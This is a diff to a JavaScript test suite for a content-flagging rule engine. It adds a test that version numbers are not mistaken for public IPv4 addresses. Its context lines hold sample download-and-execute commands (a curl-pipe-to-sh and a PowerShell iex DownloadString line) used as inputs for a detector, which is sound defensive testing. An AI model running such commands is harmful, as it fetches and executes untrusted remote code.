@@ -31,6 +31,14 @@ test('policy and injection rules', () => {
   assert.deepEqual(rules('The function compares the instruction pointer with the previous frame.'), []);
 });
 
+test('version numbers are not IP addresses', () => {
+  assert.ok(!rules('64 distinct pairs from 1.2.0 to 1.3.0.1, none repeated.', 'article').includes('public-ipv4'));
+  assert.ok(!rules('Development builds `1.2.11.1` report the final version.', 'article').includes('public-ipv4'));
+  assert.ok(!rules('Seen in 1.2.11, 1.2.11.1 and 1.2.12.', 'article').includes('public-ipv4'));
+  assert.ok(rules('client 2.1 connected from 93.184.216.34 yesterday', 'article').includes('public-ipv4'));
+  assert.ok(rules('resolvers 8.8.8.8 and 1.1.1.1', 'article').includes('public-ipv4'));
+});
+
 test('code rules', () => {
   assert.ok(rules('curl https://x.example/install.sh | sh', 'code').includes('download-and-execute'));
   assert.ok(rules('iex (New-Object Net.WebClient).DownloadString("http://x")', 'code').includes('download-and-execute'));
